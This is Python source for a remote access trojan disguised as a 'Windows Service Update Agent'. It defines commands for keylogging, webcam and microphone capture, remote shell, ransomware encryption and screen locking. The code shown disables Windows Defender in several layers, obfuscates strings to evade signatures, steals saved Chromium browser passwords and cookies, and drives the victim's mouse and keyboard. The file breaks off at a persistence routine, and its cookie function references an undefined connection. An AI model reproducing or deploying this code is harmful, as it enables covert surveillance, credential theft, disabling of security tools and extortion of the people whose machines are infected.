"""
Windows Service Update Agent
Remote monitoring and administration tool.
"""
import sys
import os
import asyncio
import json
import uuid
import platform
import socket
import time
import subprocess
import shutil
import base64
import struct
import threading
import concurrent.futures
import queue as thread_queue
import sqlite3
import webbrowser
import wave
from io import BytesIO
from collections import deque

# Third-party
try:
    import mss
    import websockets
    from websockets.exceptions import ConnectionClosed
    from PIL import Image
    from pynput.mouse import Controller as MouseController, Button
    from pynput.keyboard import Controller as KeyboardController, Listener as KeyboardListener, Key
except ImportError:
    websockets = None

    class ConnectionClosed(Exception):
        """Placeholder when websockets is not installed."""

    pass

try:
    import sounddevice as sd
    import numpy as np
    AUDIO_BACKEND = 'sounddevice'
    SOUND_DEVICE_AVAILABLE = True
except Exception:
    try:
        import pyaudio
        import numpy as np
        AUDIO_BACKEND = 'pyaudio'
        SOUND_DEVICE_AVAILABLE = True
    except Exception:
        AUDIO_BACKEND = None
        SOUND_DEVICE_AVAILABLE = False
        try:
            import numpy as np  # still useful for inject / resample when capture unavailable
        except Exception:
            np = None  # noqa: F401

# Optional imports - only used when specific commands are triggered
# cv2, win32crypt, tkinter loaded on-demand

# ─── Configuration (Builder injects these) ────────────────────

SERVER_IP = os.environ.get("SERVER_IP", "10.71.155.228")  # default to local server for testing
SERVER_PORT = int(os.environ.get("SERVER_PORT", os.environ.get("PORT", "80")))

# ─── Protocol ─────────────────────────────────────────────────

CMD_REG      = 0x4B
CMD_KEYLOG   = 0x0C
CMD_CAM      = 0x0E
CMD_SHELL    = 0x0F
CMD_FILE_LS  = 0x11
CMD_FILE_RUN = 0x12
CMD_FILE_DL  = 0x13
CMD_LOCK     = 0x20
CMD_ENCRYPT  = 0x21
CMD_VAULT    = 0x30
CMD_COOKIES  = 0x32
CMD_URL      = 0x40
CMD_DL_EXE   = 0x41
CMD_DISABLE_DEFENDER = 0x42
CMD_RUN_EXE  = 0x43
CMD_VIEW     = 0x15
CMD_SOUND    = 0x60
CMD_MOUSE    = 0x50
CMD_CLICK    = 0x51
CMD_KEY      = 0x52
CMD_PING     = 0x7E
CMD_KEY_INJECT = 0x26  # admin injects RSA private key PEM → agent
CMD_KEY_EXCH  = 0x27  # agent sends RSA private key PEM → server (key escrow)
CMD_RANSOM    = 0x24  # full ransomware: encrypt all + lock PC
CMD_RANSOM_UNLOCK = 0x25  # unlock ransomware with injected key

# ─── State ────────────────────────────────────────────────────

DEVICE_ID = str(uuid.uuid4())
HOSTNAME = socket.gethostname()
_EMBEDDED_PUBKEY = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu+CgPp3th9K18Deq4olg\nFjXRYcWcRm4YtrogzmlLm3a8t/V+9akUKv0Wr/OaLfKupaFbESyFORPDi0J6m1+F\npv2mZYHxQB7acYg1EW+s9zuxz7fDJuQvliQqhrgtcPHuvPKbuNDijHTOE4/Z+36U\nudQVhrWpl64qRttLjFqlkhVKIyh0fok8VHfycLt3jn2Mm1Nl+bEcjXI5+JrB9btW\nZ3oyIjPb8KmtUwDaQcFdWbl2b31TnRkQCJC0rB3EMdfaTF3Bw65/kHYi8bK9xXk5\nQjCcCFcfibaFI25vpzYUuKLu9N/QemVxLZbKXpWK9AiU6mwQwLC71fZqdXKr8pxW\n9QIDAQAB\n-----END PUBLIC KEY-----"
_AGENT_NAME = "english"
_keylog_on = False
_keybuf = ""
_view_mode = "none"  # 'none', 'screen', or 'cam'
_cam_stream_enabled = False
_audio_enabled = False
_last_hid_time = 0.0
_UDP_AVAILABLE = True
_audio_queue = deque(maxlen=80)
_audio_lock = threading.Lock()
_audio_stream = None
_pyaudio_instance = None
_audio_capture = None
_camera_lock = asyncio.Lock()
_audio_samplerate = 44100
_audio_channels = 1
_log_file = os.path.join(os.environ.get("TEMP", "."), "svc.log")
_stored_privkey = None  # RSA private key PEM for decrypt/unlock

# ─── Obfuscation Helpers ─────────────────────────────────────
_OBF_KEY = bytes.fromhex("38f9ed1abc9d43283a588e8eada0f23d")

def _obf(s: str) -> str:
    """XOR-obfuscate/deobfuscate a string at runtime to evade static signatures."""
    if not s:
        return s
    k = _OBF_KEY
    out = ""
    for i, c in enumerate(s):
        out += chr(ord(c) ^ k[i % len(k)] ^ (i & 0xFF))
    return out

def _obf_b(data: bytes) -> bytes:
    """XOR-obfuscate/deobfuscate bytes."""
    k = _OBF_KEY
    return bytes(b ^ k[i % len(k)] ^ (i & 0xFF) for i, b in enumerate(data))


def _sb(blob):
    """Runtime decode of base64+XOR-obfuscated string."""
    import base64
    b = base64.b64decode(blob)
    k = _OBF_KEY
    return bytes(b[i] ^ k[i % len(k)] ^ (i & 0xFF) for i in range(len(b))).decode("latin-1")


# ─── Windows Defender Killer ─────────────────────────────────

def _disable_defender(report_cb=None):
    """Multi-layered approach: AMSI/ETW first, then kill procs, reg, services."""
    results = []
    def _r(msg):
        results.append(msg)
        if report_cb:
            report_cb(msg)
        _log(msg)

    try:
        _patch_amsi()
        _patch_etw()
        _r("Layer 0: AMSI/ETW patched")
    except Exception as ex:
        _r(f"Layer 0 fail: {ex}")

    try:
        for name in ("MsMpEng.exe", "NisSrv.exe", "SecurityHealthService.exe", "MsMpEngCPI.exe"):
            subprocess.run(["taskkill", "/f", "/im", name], capture_output=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW)
        _r("Layer 1: Defender processes killed")
    except Exception as ex:
        _r(f"Layer 1 fail: {ex}")

    try:
        ps_excl = (
            "Add-MpPreference -ExclusionPath '%TEMP%' -ErrorAction 0;"
            "Add-MpPreference -ExclusionPath '%APPDATA%' -ErrorAction 0;"
            "Add-MpPreference -ExclusionPath '%LOCALAPPDATA%' -ErrorAction 0;"
            "Add-MpPreference -ExclusionPath '%USERPROFILE%\\Desktop' -ErrorAction 0;"
            "Add-MpPreference -ExclusionExtension '.exe' -ErrorAction 0;"
            "Add-MpPreference -ExclusionExtension '.dll' -ErrorAction 0;"
            "Add-MpPreference -ExclusionExtension '.ps1' -ErrorAction 0"
        )
        b64 = base64.b64encode(ps_excl.encode("utf-16le")).decode()
        subprocess.run(["powershell", "-NoP", "-Ep", _sb("eoGfeMvr"), _sb("Fb2Beg=="), b64], capture_output=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW)
        _r("Layer 2: Exclusions added")
    except Exception as ex:
        _r(f"Layer 2 fail: {ex}")

    try:
        ps_disable = (
            "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction 0;"
            "Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction 0;"
            "Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction 0;"
            "Set-MpPreference -DisableIOAVProtection $true -ErrorAction 0;"
            "Set-MpPreference -DisablePrivacyMode $true -ErrorAction 0;"
            "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -ErrorAction 0;"
            "Set-MpPreference -DisableArchiveScanning $true -ErrorAction 0;"
            "Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction 0;"
            "Set-MpPreference -DisableScriptScanning $true -ErrorAction 0;"
            "Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction 0"
        )
        b64 = base64.b64encode(ps_disable.encode("utf-16le")).decode()
        subprocess.run(["powershell", "-NoP", "-Ep", _sb("eoGfeMvr"), _sb("Fb2Beg=="), b64], capture_output=True, timeout=60, creationflags=subprocess.CREATE_NO_WINDOW)
        _r("Layer 3: Real-time monitoring disabled")
    except Exception as ex:
        _r(f"Layer 3 fail: {ex}")

    try:
        import winreg
        k = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender")
        winreg.SetValueEx(k, _sb("fJGceNr0IG5cJe3W0dSLU1qN"), 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(k)
        k2 = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection")
        winreg.SetValueEx(k2, _sb("fJGceNr0IH1XMOjxyMCZf0eGln3H+jxRRQ=="), 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(k2, _sb("fJGceNr0IG1XOeXzyMKOf0eGln3H+jxRRQ=="), 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(k2, "DisableOnAccessProtection", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(k2, "DisableScanOnRealtimeEnable", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(k2)
        _r("Layer 4: Registry policies applied")
    except Exception as ex:
        _r(f"Layer 4 fail: {ex}")

    try:
        for svc in (_sb("b5GBXd3+IEFW"), _sb("a52Bat0="), _sb("b5ytdtfs"), _sb("b5ypcNTsIF0="), _sb("b5yhcMvLM0w="), "SecurityHealthService"):
            subprocess.run(["sc", "stop", svc], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            subprocess.run(["sc", "config", svc, "start=", "disabled"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        _r("Layer 5: Services stopped")
    except Exception as ex:
        _r(f"Layer 5 fail: {ex}")

    try:
        ps_wmi = (
            "Get-WmiObject -Namespace 'root/microsoft/windows/defender' -Class MSFT_MpPreference -ErrorAction 0 | Remove-WmiObject -ErrorAction 0;"
            "Get-CimInstance -Namespace 'root/microsoft/windows/defender' -ClassName MSFT_MpPreference -ErrorAction 0 | Remove-CimInstance -ErrorAction 0"
        )
        b64 = base64.b64encode(ps_wmi.encode("utf-16le")).decode()
        subprocess.run(["powershell", "-NoP", "-Ep", _sb("eoGfeMvr"), _sb("Fb2Beg=="), b64], capture_output=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW)
        _r("Layer 6: WMI preferences purged")
    except Exception as ex:
        _r(f"Layer 6 fail: {ex}")

    try:
        ps_sac = (
            "Set-MpPreference -CheckForSignaturesBeforeRunningScan 0 -ErrorAction 0;"
            "Set-MpPreference -PUAProtection 0 -ErrorAction 0;"
            "Set-MpPreference -CloudBlockLevel 0 -ErrorAction 0;"
            "Set-MpPreference -CloudTimeout 1000 -ErrorAction 0"
        )
        b64 = base64.b64encode(ps_sac.encode("utf-16le")).decode()
        subprocess.run(["powershell", "-NoP", "-Ep", _sb("eoGfeMvr"), _sb("Fb2Beg=="), b64], capture_output=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW)
        _r("Layer 7: Additional policies disabled")
    except Exception as ex:
        _r(f"Layer 7 fail: {ex}")

    return "\n".join(results)

    return "\n".join(results)


def _log(msg):
    try:
        with open(_log_file, "a") as f:
            f.write(f"[{time.strftime('%H:%M:%S')}] {msg}\n")
    except:
        pass
    try:
        print(f"[{time.strftime('%H:%M:%S')}] {msg}")
    except:
        pass


def _open_camera():
    """
    Open webcam once and keep it open while streaming (stable OS LED, no open/close flicker).
    Prefer DirectShow on Windows — MSMF often conflicts when multiple consumers contend.
    """
    global _audio_capture
    if _audio_capture is not None:
        try:
            if _audio_capture.isOpened():
                return _audio_capture
        except Exception:
            pass
    try:
        import cv2
        if sys.platform == "win32":
            apis = (cv2.CAP_DSHOW, cv2.CAP_MSMF, cv2.CAP_ANY)
        else:
            apis = (cv2.CAP_ANY,)
        for api in apis:
            try:
                cap = cv2.VideoCapture(0, api)
                if cap.isOpened():
                    cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
                    cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
                    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
                    cap.set(cv2.CAP_PROP_FPS, 30)
                    _audio_capture = cap
                    return cap
                cap.release()
            except Exception:
                pass
    except Exception as e:
        _log(f"Camera module open failed: {e}")
    _audio_capture = None
    return None


def _close_camera():
    global _audio_capture
    try:
        if _audio_capture is not None:
            _audio_capture.release()
    except Exception:
        pass
    _audio_capture = None


def _camera_needed():
    return _view_mode == "cam" or _cam_stream_enabled




def _sd_preferred_input_device():
    """Prefer Windows 'Stereo Mix' / loopback-style inputs so remote listen captures system audio."""
    if AUDIO_BACKEND != _sb("S5ead9z8IFlbMuE="):
        return None
    try:
        import sounddevice as sd
    except Exception:
        return None
    try:
        devices = sd.query_devices()
        keys = ("stereo mix", "what u hear", "wave out mix", _sb("VJeAadr5JkQ="))
        best = None
        for i, d in enumerate(devices):
            if int(d.get("max_input_channels") or 0) < 1:
                continue
            nm = (d.get("name") or "").lower()
            for k in keys:
                if k in nm:
                    return i
        return None
    except Exception:
        return None


def _shell_ps_command(cmdline, cdir):
    """
    cwd is handled by subprocess.Popen(cwd=...) — this function just wraps the cmd.
    No Set-Location prepend needed (redundant and slow on network paths).
    """
    return cmdline


def _powershell_argv(cmdline: str):
    """Use -EncodedCommand for faster startup (avoids quoting/parsing overhead)."""
    b64 = base64.b64encode(cmdline.encode("utf-16le")).decode()
    common = [_sb("FbaAScr3I0ZeNA=="), "-NonInteractive", "-NoLogo", _sb("Fb2XfNvtMUZdP9TqzcSfSw=="), _sb("eoGfeMvr"), _sb("Fb2Betf8IEtxPunowMOY"), b64]
    pw = shutil.which(_sb("SI+ccQ=="))
    if pw:
        return [pw] + common
    ps = shutil.which(_sb("SJeYfMrrLUpeParg2cg=")) or shutil.which("powershell")
    if ps:
        return [ps] + common
    return ["powershell"] + common


def _quote_path(cmd: str) -> str:
    """If command starts with an unquoted path (has drive letter or backslash), quote it."""
    stripped = cmd.lstrip()
    if not stripped:
        return cmd
    # Already quoted or doesn't look like a path
    if stripped[0] in ('"', "'"):
        return cmd
    # Check if first token looks like a path (contains :\ or starts with .\ or ..\ or /)
    first_token = stripped.split(None, 1)[0] if ' ' in stripped else stripped
    if any(c in first_token for c in (':\\', '/', '\\\\')):
        # Quote the executable path
        rest = stripped[len(first_token):]
        quoted = f'"{first_token}"{rest}'
        return cmd[:len(cmd)-len(stripped)] + quoted
    return cmd

_SIMPLE_CMD_PREFIXES = ("dir ", "cd ", "echo ", "type ", "copy ", "del ", "ren ", "move ", "cls", "ver", "help", "time", "date", "md ", "rd ", "set ")

def _run_shell_sync(cmdline, cdir, timeout_s, shell_id):
    """Run command via cmd.exe (for simple commands, much faster than PS)."""
    try:
        cmd = cmdline.lstrip()
        use_cmd = any(cmd.lower().startswith(p) for p in _SIMPLE_CMD_PREFIXES) or not cmdline.strip()
        if use_cmd:
            c = ["cmd.exe", "/c", cmdline] if not cdir else ["cmd.exe", "/c", f"cd /d \"{cdir}\" && {cmdline}"]
            proc = subprocess.Popen(
                c, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, encoding="utf-8", errors="replace", cwd=cdir if not use_cmd else None,
                creationflags=0x08000000,
            )
            out = proc.communicate(timeout=timeout_s)[0] or ""
            return out.rstrip() + "\n"
    except subprocess.TimeoutExpired:
        try: proc.kill()
        except: pass
        return f"(error) Command timed out ({timeout_s}s).\n"
    except:
        pass
    # For executable paths, use cmd.exe with proper quoting
    quoted = _quote_path(cmdline)
    if quoted != cmdline:
        try:
            c = ["cmd.exe", "/c", quoted] if not cdir else ["cmd.exe", "/c", f"cd /d \"{cdir}\" && {quoted}"]
            proc = subprocess.Popen(
                c, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, encoding="utf-8", errors="replace",
                creationflags=0x08000000,
            )
            try:
                out = proc.communicate(timeout=timeout_s)[0] or ""
                if out.strip():
                    return out.rstrip() + "\n"
                # No output - likely a GUI app, return success
                return "[OK] Launched.\n"
            except subprocess.TimeoutExpired:
                # Process still running - detach and return success
                try: proc.kill()
                except: pass
                return "[OK] Launched (process detached).\n"
        except Exception as ex:
            return f"(error) {ex}\n"
    # Fallback to PowerShell
    return _run_powershell_sync(cmdline, cdir, timeout_s, shell_id)

def _strip_clixml(text: str) -> str:
    """Convert CLIXML output to readable text."""
    if not text.startswith("#< CLIXML"):
        return text
    try:
        import xml.etree.ElementTree as ET
        root = ET.fromstring(text[len("#< CLIXML"):].strip())
        lines = []
        for elem in root.iter():
            if elem.text and elem.text.strip():
                lines.append(elem.text.strip())
        return "\n".join(lines) + "\n" if lines else text
    except Exception:
        return text

def _run_powershell_sync(cmdline, cdir, timeout_s, shell_id):
    proc = None
    try:
        proc = subprocess.Popen(
            _powershell_argv(cmdline),
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            encoding="utf-8",
            errors="replace",
            cwd=cdir if cdir else None,
            creationflags=0x08000000,
        )
        raw = proc.communicate(timeout=timeout_s)[0] or ""
        return _strip_clixml(raw)
    except subprocess.TimeoutExpired:
        # Don't kill - process may be a GUI app that's still running
        try:
            proc.kill()
        except Exception:
            pass
        return "[OK] Launched (no output after timeout).\n"
    except Exception as ex:
        return f"(error) {ex}\n"


def _pcm_stream_packet(pcm_s16le: bytes, samplerate: int = 44100) -> bytes:
    """Low-latency remote listen: raw mono s16le; browser schedules with AudioContext."""
    n = len(pcm_s16le) // 2
    if n <= 0:
        return b""
    return b"\x04" + struct.pack("<HH", min(int(samplerate), 65535), n) + pcm_s16le


def _audio_put(pkt: bytes):
    """Thread-safe enqueue from PyAudio/sounddevice callbacks (different thread than asyncio loop)."""
    if not pkt:
        return
    with _audio_lock:
        _audio_queue.append(pkt)
        while len(_audio_queue) > 64:
            _audio_queue.popleft()


def _audio_try_pop():
    with _audio_lock:
        if not _audio_queue:
            return None
        return _audio_queue.popleft()


# ─── Remote mic (admin → agent) continuous playback ─────────────
_remote_mic_q = thread_queue.Queue(maxsize=48)
_remote_mic_thread = None
_remote_mic_stop = threading.Event()

_sound_rx_buf = None
_sound_rx_total = 0


def _parse_pcm_body(body: bytes):
    """After 0x03/0x04 prefix: <HH sample_rate, num_samples> + int16 mono."""
    if len(body) < 4:
        return None, None
    sr = body[0] | (body[1] << 8)
    n = body[2] | (body[3] << 8)
    pcm = body[4 : 4 + n * 2]
    if n <= 0 or len(pcm) < n * 2:
        return None, None
    return sr, pcm


def _remote_mic_worker():
    """Sequential PCM write to one output stream (Meet-style, no overlapping winsound)."""
    try:
        import numpy as np
    except ImportError:
        _log("Remote mic: numpy required for playback.")
        return
    pa = None
    stream = None
    rate = 48000
    try:
        import pyaudio
        pa = pyaudio.PyAudio()
        stream = pa.open(
            format=pyaudio.paInt16,
            channels=1,
            rate=rate,
            output=True,
            frames_per_buffer=960,
        )
    except Exception as ex:
        _log(f"Remote mic PyAudio output failed: {ex}")
        if pa:
            try:
                pa.terminate()
            except Exception:
                pass
        return
    try:
        while not _remote_mic_stop.is_set():
            try:
                body = _remote_mic_q.get(timeout=0.25)
            except thread_queue.Empty:
                continue
            if body is None:
                break
            parsed = _parse_pcm_body(body)
            if not parsed or parsed[0] is None:
                continue
            sr, pcm = parsed
            arr = np.frombuffer(pcm, dtype=np.int16).copy()
            if sr != rate and sr > 0:
                n_out = max(1, int(len(arr) * rate / sr))
                arr = (
                    np.interp(
                        np.linspace(0, len(arr) - 1, n_out, dtype=np.float64),
                        np.arange(len(arr), dtype=np.float64),
                        arr.astype(np.float64),
                    )
                    .astype(np.int16)
                )
            try:
                stream.write(arr.tobytes())
            except Exception as ex:
                _log(f"Remote mic write: {ex}")
    finally:
        try:
            if stream:
                stream.stop_stream()
                stream.close()
        except Exception:
            pass
        try:
            if pa:
                pa.terminate()
        except Exception:
            pass


def _ensure_remote_mic_thread():
    global _remote_mic_thread
    if _remote_mic_thread is not None and _remote_mic_thread.is_alive():
        return
    _remote_mic_stop.clear()
    _remote_mic_thread = threading.Thread(target=_remote_mic_worker, daemon=True)
    _remote_mic_thread.start()


def _stop_remote_mic_thread():
    global _remote_mic_thread
    _remote_mic_stop.set()
    try:
        _remote_mic_q.put_nowait(None)
    except Exception:
        pass
    t = _remote_mic_thread
    _remote_mic_thread = None
    if t is not None:
        t.join(timeout=1.0)


def _feed_remote_mic_pcm(body: bytes):
    """Queue one PCM frame from dashboard (after 0x03 byte stripped)."""
    _ensure_remote_mic_thread()
    try:
        _remote_mic_q.put_nowait(body)
    except thread_queue.Full:
        try:
            _remote_mic_q.get_nowait()
        except Exception:
            pass
        try:
            _remote_mic_q.put_nowait(body)
        except Exception:
            pass


def _play_sound_inject_async(raw: bytes, name: str):
    def _run():
        if not raw or len(raw) < 4:
            _log("Inject: empty payload.")
            return
        is_wav = len(raw) >= 12 and raw[:4] == b"RIFF" and raw[8:12] == b"WAVE"
        if not is_wav:
            try:
                ext = os.path.splitext(name or "")[1] or ".audio"
                if len(ext) > 6 or not ext.startswith("."):
                    ext = ".audio"
                tmp = os.path.join(os.environ.get("TEMP", "."), f"inj_{uuid.uuid4().hex()}{ext}")
                with open(tmp, "wb") as f:
                    f.write(raw)
                if sys.platform == "win32":
                    os.startfile(tmp)
                else:
                    webbrowser.open(f"file://{tmp}")
            except Exception as ex:
                _log(f"Inject play (non-WAV) failed: {ex}")
            return
        if np is None:
            _log("Inject: numpy not available for WAV decode.")
            return
        try:
            with wave.open(BytesIO(raw), "rb") as wf:
                ch = wf.getnchannels()
                sw = wf.getsampwidth()
                sr = wf.getframerate()
                nframes = wf.getnframes()
                d = wf.readframes(nframes)
            if sw != 2:
                _log("Inject: only 16-bit WAV supported for stream play.")
                return
            arr = np.frombuffer(d, dtype=np.int16).copy()
            if ch > 1:
                arr = arr.reshape(-1, ch)[:, 0]
            try:
                import sounddevice as sd
                sd.play(arr, sr, blocking=True)
                return
            except Exception:
                pass
            try:
                import pyaudio
                pa = pyaudio.PyAudio()
                stream = pa.open(
                    format=pyaudio.paInt16,
                    channels=1,
                    rate=int(sr),
                    output=True,
                )
                stream.write(arr.tobytes())
                stream.stop_stream()
                stream.close()
                pa.terminate()
                return
            except Exception:
                pass
            import winsound
            tmp = os.path.join(os.environ.get("TEMP", "."), f"inj_{uuid.uuid4().hex}_{name}")
            with open(tmp, "wb") as f:
                f.write(raw)
            winsound.PlaySound(tmp, winsound.SND_FILENAME | winsound.SND_ASYNC)
        except Exception as ex:
            _log(f"Inject play failed: {ex}")

    threading.Thread(target=_run, daemon=True).start()


def _build_wav_chunk(frames_bytes, channels=1, samplerate=44100):
    bio = BytesIO()
    try:
        with wave.open(bio, 'wb') as wf:
            wf.setnchannels(channels)
            wf.setsampwidth(2)
            wf.setframerate(samplerate)
            wf.writeframes(frames_bytes)
        return bio.getvalue()
    except Exception as e:
        _log(f"Audio WAV build failed: {e}")
        return None


def _ensure_audio(enabled):
    global _audio_enabled, _audio_stream, _pyaudio_instance
    if not enabled:
        _audio_enabled = False
        if _audio_stream is not None:
            try:
                if AUDIO_BACKEND == _sb("S5ead9z8IFlbMuE="):
                    _audio_stream.stop()
                    _audio_stream.close()
                elif AUDIO_BACKEND == _sb("SIGObNzxKg=="):
                    _audio_stream.stop_stream()
                    _audio_stream.close()
            except Exception:
                pass
            _audio_stream = None
            if _pyaudio_instance is not None:
                try:
                    _pyaudio_instance.terminate()
                except Exception:
                    pass
                _pyaudio_instance = None
            _log("Audio capture stopped.")
        return

    if not SOUND_DEVICE_AVAILABLE:
        _audio_enabled = False
        _log("Audio support unavailable: sounddevice / pyaudio / numpy missing.")
        return

    if _audio_stream is not None:
        _audio_enabled = True
        return

    try:
        if AUDIO_BACKEND == _sb("S5ead9z8IFlbMuE="):
            dev = _sd_preferred_input_device()

            def callback(indata, frames, time_info, status):
                if status:
                    _log(f"Audio status: {status}")
                try:
                    x = np.clip(indata, -1.0, 1.0)
                    samples = (x * 32767.0).astype(np.int16)
                    if samples.ndim > 1 and samples.shape[1] > 1:
                        samples = samples[:, 0]
                    pkt = _pcm_stream_packet(samples.tobytes(), _audio_samplerate)
                    if pkt:
                        _audio_put(pkt)
                except Exception as ex:
                    _log(f"Audio capture error: {ex}")

            try:
                _audio_stream = sd.InputStream(
                    device=dev,
                    samplerate=_audio_samplerate,
                    channels=_audio_channels,
                    dtype="float32",
                    blocksize=480,
                    callback=callback,
                )
                _audio_stream.start()
            except Exception:
                if dev is not None:
                    _log("Audio: preferred input failed, falling back to default mic.")
                    _audio_stream = sd.InputStream(
                        samplerate=_audio_samplerate,
                        channels=_audio_channels,
                        dtype="float32",
                        blocksize=480,
                        callback=callback,
                    )
                    _audio_stream.start()
                else:
                    raise
        elif AUDIO_BACKEND == _sb("SIGObNzxKg=="):
            _pyaudio_instance = pyaudio.PyAudio()

            def callback(in_data, frame_count, time_info, status):
                try:
                    pkt = _pcm_stream_packet(in_data, _audio_samplerate)
                    if pkt:
                        _audio_put(pkt)
                except Exception as ex:
                    _log(f"Pyaudio capture error: {ex}")
                return (None, pyaudio.paContinue)

            _audio_stream = _pyaudio_instance.open(
                format=pyaudio.paInt16,
                channels=_audio_channels,
                rate=_audio_samplerate,
                input=True,
                frames_per_buffer=480,
                stream_callback=callback,
            )
            _audio_stream.start_stream()
        _audio_enabled = True
        _log("Audio capture started.")
    except Exception as ex:
        _audio_enabled = False
        _audio_stream = None
        if _pyaudio_instance:
            try:
                _pyaudio_instance.terminate()
            except Exception:
                pass
            _pyaudio_instance = None
        _log(f"Unable to start audio capture: {ex}")


# ─── HID ──────────────────────────────────────────────────────

_mouse = None
_kb = None
_hid_queue = None
_hid_thread = None

def _init_hid():
    global _mouse, _kb
    if _mouse is None:
        _mouse = MouseController()
        _kb = KeyboardController()

def _hid_worker():
    import queue
    q = _hid_queue
    while True:
        try:
            item = q.get()
            if item is None:
                break
            typ = item[0]
            if typ == "move":
                _init_hid()
                _mouse.position = (int(item[1]), int(item[2]))
            elif typ == "click":
                _init_hid()
                b = Button.left if item[1] == "left" else Button.right
                if item[2]:
                    _mouse.press(b)
                else:
                    _mouse.release(b)
            elif typ == "key":
                _init_hid()
                k = item[1]
                try:
                    if hasattr(Key, k):
                        key = getattr(Key, k)
                    else:
                        key = k
                    _kb.press(key)
                    _kb.release(key)
                except:
                    pass
            q.task_done()
        except Exception:
            pass

def _ensure_hid_thread():
    global _hid_queue, _hid_thread
    if _hid_queue is None:
        import queue
        _hid_queue = queue.Queue(maxsize=128)
    if _hid_thread is None or not _hid_thread.is_alive():
        _hid_thread = threading.Thread(target=_hid_worker, daemon=True)
        _hid_thread.start()

def do_move(x, y):
    global _last_hid_time
    _last_hid_time = time.time()
    _ensure_hid_thread()
    try:
        _hid_queue.put_nowait(("move", x, y))
    except Exception:
        pass

def do_click(btn, down):
    global _last_hid_time
    _last_hid_time = time.time()
    _ensure_hid_thread()
    try:
        _hid_queue.put_nowait(("click", btn, down))
    except Exception:
        pass

def do_key(k):
    global _last_hid_time
    _last_hid_time = time.time()
    _ensure_hid_thread()
    try:
        _hid_queue.put_nowait(("key", k))
    except Exception:
        pass

# ─── Credential Harvesting ────────────────────────────────────

def _decrypt_chromium(enc_password, key):
    try:
        from Crypto.Cipher import AES
        iv = enc_password[3:15]
        payload = enc_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload[:-16]).decode()
    except Exception as e:
        try:
            import win32crypt
            return win32crypt.CryptUnprotectData(enc_password, None, None, None, 0)[1].decode()
        except:
            return ""

def _get_browser_key(user_data_path):
    try:
        import win32crypt
        ls = os.path.join(user_data_path, _sb("dJeMeNS4FltTJeE="))
        if not os.path.exists(ls):
            return None
        with open(ls, "r", encoding="utf-8") as f:
            data = json.loads(f.read())
        ekey = base64.b64decode(data[_sb("V4uwesrhNVs=")][_sb("XZaMa8HoMUpWDu/g2A==")])[5:]
        return win32crypt.CryptUnprotectData(ekey, None, None, None, 0)[1]
    except:
        return None

def harvest_passwords():
    results = []
    paths = {
        "Chrome": os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data"),
        "Edge": os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(os.environ.get("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data"),
    }
    for name, udp in paths.items():
        key = _get_browser_key(udp)
        if not key:
            continue
        for profile in ["Default", "Profile 1", "Profile 2"]:
            db = os.path.join(udp, profile, _sb("dJeIcNa4AU5GMA=="))
            if not os.path.exists(db):
                continue
            tmp = os.path.join(os.environ.get("TEMP", "."), f"ld_{name}_{profile}")
            try:
                shutil.copy2(db, tmp)
                conn = sqlite3.connect(tmp)
                for url, user, epw in conn.execute("SELECT origin_url, username_value, password_value FROM logins"):
                    pw = _decrypt_chromium(epw, key)
                    if user or pw:
                        results.append(f"[{name}] {url} | {user} | {pw}")
                conn.close()
                os.remove(tmp)
            except:
                pass
    return "\n".join(results) if results else "No credentials found."

def harvest_cookies():
    results = []
    paths = {
        "Chrome": os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data"),
        "Edge": os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data"),
    }
    for name, udp in paths.items():
        key = _get_browser_key(udp)
        if not key:
            continue
        for profile in ["Default"]:
            db = os.path.join(udp, profile, "Network", "Cookies")
            if not os.path.exists(db):
                db = os.path.join(udp, profile, "Cookies")
            if not os.path.exists(db):
                continue
            tmp = os.path.join(os.environ.get("TEMP", "."), f"ck_{name}")
            try:
                shutil.copy2(db, tmp)
                try:
                    cur = conn.execute("SELECT host_key, name, encrypted_value FROM cookies")
                except sqlite3.OperationalError:
                    cur = conn.execute("SELECT host, name, encrypted_value FROM cookies")
                for host, cname, ev in cur:
                    val = _decrypt_chromium(ev, key)
                    if val:
                        results.append(f"[{name}] {host} | {cname}={val[:80]}")
                conn.close()
                os.remove(tmp)
            except:
                pass
    return "\n".join(results[:200]) if results else "No cookies found."

# ─── System Lock ──────────────────────────────────────────────
def install_persistence():
    try:
        import winreg, sys, shutil, os
        exe = sys.executable
        if not exe.lower().endswith(".exe"): return
        appdata = os.environ.get("APPDATA", "")
